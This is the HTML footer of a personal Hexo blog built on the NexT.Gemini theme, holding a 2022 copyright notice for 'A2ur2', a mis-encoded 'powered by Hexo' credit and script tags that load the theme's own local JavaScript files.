    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">A2ur2</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
